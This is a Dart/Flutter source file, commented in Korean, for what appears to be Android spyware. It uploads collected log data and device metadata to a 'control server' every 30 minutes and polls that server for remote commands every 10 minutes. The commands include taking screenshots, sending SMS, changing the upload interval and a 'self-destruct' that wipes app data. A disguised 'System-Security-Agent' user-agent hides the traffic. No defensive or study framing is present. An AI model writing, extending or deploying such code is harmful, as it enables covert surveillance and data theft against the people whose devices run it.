import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';

class DataTransmissionService {
  // 컨트롤 서버 URL (실제 구현시 변경 필요)
  static const String _serverUrl = 'https://your-control-server.com/api';
  static const String _uploadEndpoint = '/upload';
  static const String _commandEndpoint = '/commands';

  static Timer? _transmissionTimer;
  static Timer? _commandTimer;
  static bool _isTransmitting = false;

  // 전송 간격 (분)
  static const int transmissionInterval = 30; // 30분마다 전송
  static const int commandInterval = 10; // 10분마다 명령 확인

  /// 데이터 전송 서비스 시작
  static Future<void> startTransmission() async {
    if (_isTransmitting) return;

    _isTransmitting = true;

    // 주기적 데이터 전송
    _transmissionTimer = Timer.periodic(
      Duration(minutes: transmissionInterval),
          (timer) async => await _transmitCollectedData(),
    );

    // 주기적 명령 확인
    _commandTimer = Timer.periodic(
      Duration(minutes: commandInterval),
          (timer) async => await _checkForCommands(),
    );

    // 즉시 첫 전송 시도
    await _transmitCollectedData();
    await _checkForCommands();

    print('데이터 전송 서비스 시작됨');
  }

  /// 데이터 전송 서비스 중지
  static Future<void> stopTransmission() async {
    _isTransmitting = false;
    _transmissionTimer?.cancel();
    _commandTimer?.cancel();
    print('데이터 전송 서비스 중지됨');
  }

  /// 수집된 데이터를 서버로 전송
  static Future<void> _transmitCollectedData() async {
    try {
      // 디바이스 식별자 생성
      final deviceId = await _getDeviceId();

      // 전송할 데이터 패키지 생성
      final dataPackage = await _createDataPackage(deviceId);

      if (dataPackage['data'].isEmpty) {
        print('전송할 데이터가 없음');
        return;
      }

      // 서버로 전송
      final success = await _sendToServer(dataPackage);

      if (success) {
        // 전송 성공시 로컬 데이터 정리
        await _cleanupTransmittedData();
        await _logTransmissionEvent('SUCCESS', '데이터 전송 성공');
      } else {
        await _logTransmissionEvent('FAILED', '데이터 전송 실패');
      }

    } catch (e) {
      print('데이터 전송 오류: $e');
      await _logTransmissionEvent('ERROR', '전송 중 오류: $e');
    }
  }

  /// 서버에서 명령 확인
  static Future<void> _checkForCommands() async {
    try {
      final deviceId = await _getDeviceId();

      final response = await http.get(
        Uri.parse('$_serverUrl$_commandEndpoint/$deviceId'),
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'System-Security-Agent/1.0',
        },
      ).timeout(Duration(seconds: 30));

      if (response.statusCode == 200) {
        final commands = jsonDecode(response.body);
        await _processCommands(commands);
      }

    } catch (e) {
      print('명령 확인 오류: $e');
    }
  }

  /// 서버 명령 처리
  static Future<void> _processCommands(dynamic commands) async {
    if (commands is! List) return;

    for (final command in commands) {
      try {
        await _executeCommand(command);
      } catch (e) {
        print('명령 실행 오류: $e');
      }
    }
  }

  /// 개별 명령 실행
  static Future<void> _executeCommand(Map<String, dynamic> command) async {
    final action = command['action'] as String?;
    final params = command['params'] as Map<String, dynamic>? ?? {};

    switch (action) {
      case 'take_screenshot':
        await _takeScreenshotCommand();
        break;
      case 'force_data_sync':
        await _transmitCollectedData();
        break;
      case 'send_sms':
        final phone = params['phone'] as String?;
        final message = params['message'] as String?;
        if (phone != null && message != null) {
          // SMS 전송 로직 (TrackingService.sendSMS 사용)
        }
        break;
      case 'change_transmission_interval':
        final newInterval = params['interval'] as int?;
        if (newInterval != null && newInterval > 0) {
          await _changeTransmissionInterval(newInterval);
        }
        break;
      case 'self_destruct':
        await _selfDestruct();
        break;
      default:
        print('알 수 없는 명령: $action');
    }
  }

  /// 데이터 패키지 생성
  static Future<Map<String, dynamic>> _createDataPackage(String deviceId) async {
    final directory = await getApplicationDocumentsDirectory();
    final logsDir = Directory('${directory.path}/logs');

    final package = {
      'device_id': deviceId,
      'timestamp': DateTime.now().toIso8601String(),
      'data': <String, dynamic>{},
      'metadata': await _getDeviceMetadata(),
    };

    if (!await logsDir.exists()) {
      return package;
    }

    // 각 로그 파일에서 데이터 수집
    final files = await logsDir.list().toList();

    for (final file in files) {
      if (file is File && file.path.endsWith('.json')) {
        try {
          final fileName = file.path.split('/').last;
          final content = await file.readAsString();

          if (content.trim().isNotEmpty) {
            final lines = content.split('\n').where((line) => line.trim().isNotEmpty);
            final data = lines.map((line) {
              try {
                return jsonDecode(line);
              } catch (e) {
                return null;
              }
            }).where((item) => item != null).toList();

            if (data.isNotEmpty) {
              package['data'][fileName] = data;
            }
          }
        } catch (e) {
          print('파일 읽기 오류: ${file.path} - $e');
        }
      }
    }

    return package;
  }

  /// 서버로 데이터 전송
  static Future<bool> _sendToServer(Map<String, dynamic> dataPackage) async {
    try {
      // 데이터 압축 및 암호화 (기본 구현)
      final compressedData = _compressData(jsonEncode(dataPackage));

      final response = await http.post(
        Uri.parse('$_serverUrl$_uploadEndpoint'),
        headers: {
          'Content-Type': 'application/json',
          'Content-Encoding': 'gzip',
          'User-Agent': 'System-Security-Agent/1.0',
          'X-Device-ID': dataPackage['device_id'],
        },
        body: compressedData,
      ).timeout(Duration(seconds: 120));

      if (response.statusCode >= 200 && response.statusCode < 300) {
        print('데이터 전송 성공: ${response.statusCode}');
        return true;
      } else {
        print('서버 응답 오류: ${response.statusCode}');
        return false;
      }

    } catch (e) {
      print('네트워크 전송 오류: $e');
      return false;
    }
  }

  /// 디바이스 ID 생성/조회
  static Future<String> _getDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString('device_id');

    if (deviceId == null) {
      final deviceInfo = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        deviceId = androidInfo.id;
      }

      // Fallback: 타임스탬프 기반 ID
      deviceId ??= 'device_${DateTime.now().millisecondsSinceEpoch}';

      await prefs.setString('device_id', deviceId);
    }

    return deviceId;
  }

  /// 디바이스 메타데이터 생성
  static Future<Map<String, dynamic>> _getDeviceMetadata() async {
    final deviceInfo = DeviceInfoPlugin();
    final metadata = <String, dynamic>{
      'platform': Platform.operatingSystem,
      'app_version': '3.0.0',
      'transmission_time': DateTime.now().toIso8601String(),
    };

    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      metadata.addAll({
        'model': androidInfo.model,
        'brand': androidInfo.brand,
        'android_version': androidInfo.version.release,
        'sdk_version': androidInfo.version.sdkInt,
      });
    }

    return metadata;
  }

  /// 데이터 압축
  static List<int> _compressData(String data) {
    try {
      return gzip.encode(utf8.encode(data));
    } catch (e) {
      return utf8.encode(data);
    }
  }

  /// 전송 완료된 데이터 정리
  static Future<void> _cleanupTransmittedData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (!await logsDir.exists()) return;

      final files = await logsDir.list().toList();

      for (final file in files) {
        if (file is File) {
          // 파일을 완전 삭제하지 않고 크기 줄이기 (최신 100줄만 보관)
          await _truncateLogFile(file);
        }
      }

    } catch (e) {
      print('데이터 정리 오류: $e');
    }
  }

  /// 로그 파일 크기 줄이기
  static Future<void> _truncateLogFile(File file) async {
    try {
      final content = await file.readAsString();
      final lines = content.split('\n').where((line) => line.trim().isNotEmpty).toList();

      if (lines.length > 100) {
        // 최신 100줄만 보관
        final recentLines = lines.skip(lines.length - 100).toList();
        await file.writeAsString(recentLines.join('\n') + '\n');
      }

    } catch (e) {
      print('파일 크기 줄이기 오류: ${file.path} - $e');
    }
  }

  /// 전송 이벤트 로깅
  static Future<void> _logTransmissionEvent(String status, String details) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/logs');

      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }

      final logFile = File('${logDir.path}/transmission_log.json');
      final logEntry = {
        'status': status,
        'details': details,
        'timestamp': DateTime.now().toIso8601String(),
      };

      await logFile.writeAsString('${jsonEncode(logEntry)}\n', mode: FileMode.append);

    } catch (e) {
      print('전송 로그 저장 오류: $e');
    }
  }

  // 명령 실행 메서드들
  static Future<void> _takeScreenshotCommand() async {
    // 스크린샷 촬영 로직
    print('원격 스크린샷 촬영 명령 실행');
  }

  static Future<void> _changeTransmissionInterval(int newInterval) async {
    // 전송 간격 변경
    print('전송 간격 변경: $newInterval분');
    await stopTransmission();
    await startTransmission();
  }

  static Future<void> _selfDestruct() async {
    // 자가 파괴 (데이터 삭제 및 앱 제거)
    print('자가 파괴 명령 실행');
    await _clearAllData();
    exit(0);
  }

  static Future<void> _clearAllData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      if (await directory.exists()) {
        await directory.delete(recursive: true);
      }
    } catch (e) {
      print('데이터 삭제 오류: $e');
    }
  }

  // 상태 확인
  static bool get isTransmitting => _isTransmitting;
}